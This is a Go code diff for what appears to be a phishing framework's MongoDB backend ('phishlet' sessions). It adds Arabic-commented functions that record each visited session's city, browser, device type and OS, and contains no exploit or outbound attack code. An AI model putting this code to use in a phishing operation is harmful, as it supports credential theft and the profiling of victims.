@@ -327,10 +327,6 @@ func (m *MongoDatabase) CreateSession(sid, phishlet, landingURL, useragent, remo
 		RemoteAddr:   remoteAddr,
 		CountryCode:  "",
 		Country:      "",
-		City:         "",
-		Browser:      "",
-		DeviceType:   "",
-		OS:           "",
 	}
 
 	_, err = m.sessionsColl.InsertOne(m.ctx, newSession)
@@ -765,32 +761,92 @@ func (m *MongoDatabase) SetSessionCountryInfo(sid string, countryCode, country s
 	return nil
 }
 
-func (d *Database) SetSessionCityInfo(sid string, city string) error {
-	s, err := d.sessionsGetBySid(sid)
+// SetSessionCityInfo تقوم بتحديث معلومات المدينة للجلسة في MongoDB
+func (d *MongoDatabase) SetSessionCityInfo(sid string, city string) error {
+	if city == "" {
+		return fmt.Errorf("city cannot be empty")
+	}
+
+	log.Debug("[MongoDB] تحديث معلومات المدينة للجلسة %s: %s", sid, city)
+
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	// نحاول أولاً استرداد الجلسة للتأكد من وجودها
+	filter := bson.M{"session_id": sid}
+	var mongoSession MongoSession
+	err := d.sessionsColl.FindOne(ctx, filter).Decode(&mongoSession)
 	if err != nil {
+		return fmt.Errorf("error retrieving session: %v", err)
+	}
+
+	// تحديث الجلسة مباشرة
+	update := bson.M{
+		"$set": bson.M{
+			"city": city,
+		},
+	}
+
+	result, err := d.sessionsColl.UpdateOne(ctx, filter, update)
+	if err != nil {
+		log.Error("[MongoDB] فشل تحديث معلومات المدينة: %v", err)
 		return err
 	}
-	
-	// إضافة البيانات للحقول المخصصة
-	s.Custom["city"] = city
-	s.UpdateTime = time.Now().UTC().Unix()
-	
-	err = d.sessionsUpdate(s.Id, s)
-	return err
+
+	if result.ModifiedCount == 0 && result.MatchedCount == 0 {
+		log.Error("[MongoDB] لم يتم العثور على الجلسة بمعرف %s", sid)
+		return fmt.Errorf("session not found: %s", sid)
+	}
+
+	log.Success("[MongoDB] تم تحديث معلومات المدينة بنجاح للجلسة %s: %s", sid, city)
+	return nil
 }
 
-func (d *Database) SetSessionBrowserInfo(sid string, browser string, deviceType string, os string) error {
-	s, err := d.sessionsGetBySid(sid)
+// SetSessionBrowserInfo تقوم بتحديث معلومات المتصفح والجهاز ونظام التشغيل للجلسة في MongoDB
+func (d *MongoDatabase) SetSessionBrowserInfo(sid string, browser string, deviceType string, os string) error {
+	if browser == "" && deviceType == "" && os == "" {
+		return fmt.Errorf("at least one browser info field must not be empty")
+	}
+
+	log.Debug("[MongoDB] تحديث معلومات المتصفح للجلسة %s: المتصفح=%s، الجهاز=%s، نظام التشغيل=%s", 
+		sid, browser, deviceType, os)
+
+	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
+	defer cancel()
+
+	// نحاول أولاً استرداد الجلسة للتأكد من وجودها
+	filter := bson.M{"session_id": sid}
+	var mongoSession MongoSession
+	err := d.sessionsColl.FindOne(ctx, filter).Decode(&mongoSession)
 	if err != nil {
+		return fmt.Errorf("error retrieving session: %v", err)
+	}
+
+	// إنشاء خريطة تحديث بالقيم غير الفارغة فقط
+	update := bson.M{"$set": bson.M{}}
+	updateFields := update["$set"].(bson.M)
+
+	if browser != "" {
+		updateFields["browser"] = browser
+	}
+	if deviceType != "" {
+		updateFields["device_type"] = deviceType
+	}
+	if os != "" {
+		updateFields["os"] = os
+	}
+
+	result, err := d.sessionsColl.UpdateOne(ctx, filter, update)
+	if err != nil {
+		log.Error("[MongoDB] فشل تحديث معلومات المتصفح: %v", err)
 		return err
 	}
-	
-	// إضافة البيانات للحقول المخصصة
-	s.Custom["browser"] = browser
-	s.Custom["device_type"] = deviceType
-	s.Custom["os"] = os
-	s.UpdateTime = time.Now().UTC().Unix()
-	
-	err = d.sessionsUpdate(s.Id, s)
-	return err
+
+	if result.ModifiedCount == 0 && result.MatchedCount == 0 {
+		log.Error("[MongoDB] لم يتم العثور على الجلسة بمعرف %s", sid)
+		return fmt.Errorf("session not found: %s", sid)
+	}
+
+	log.Success("[MongoDB] تم تحديث معلومات المتصفح بنجاح للجلسة %s", sid)
+	return nil
 } 
